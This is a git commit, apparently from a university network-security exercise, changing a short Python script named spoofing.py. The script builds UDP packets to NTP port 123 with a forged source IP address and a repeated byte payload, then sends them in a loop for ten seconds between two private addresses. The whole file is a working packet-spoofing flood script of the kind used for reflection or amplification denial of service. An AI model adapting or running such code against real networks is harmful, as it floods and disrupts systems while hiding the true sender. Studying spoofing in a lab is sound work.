5b0d5a0a0ec29456b0e648b19303bb05518b2fef
nubi12336 <syislu62823@kaist.ac.kr>
2021-04-13 14:52:50 +0900

    d

--- spoofing.py
+++ spoofing.py
@@ -3,11 +3,9 @@ import time
 
 A= "192.168.30.1"
 B= "192.168.20.1"
-C= RandShort()
-D= 123
-E= "\x1b\x00\x03\x2a" * 12
+C= "\x1b\x00\x03\x2a" * 12
 
 start = time.time()
 while (time.time() - start < 10):
-    spoofed_packet = IP(src=A, dst=B) / UDP(sport=C, dport=D) / E
+    spoofed_packet = IP(src=A, dst=B) / UDP(sport=random.randint(2000,65535), dport=123) / C
     send(spoofed_packet)
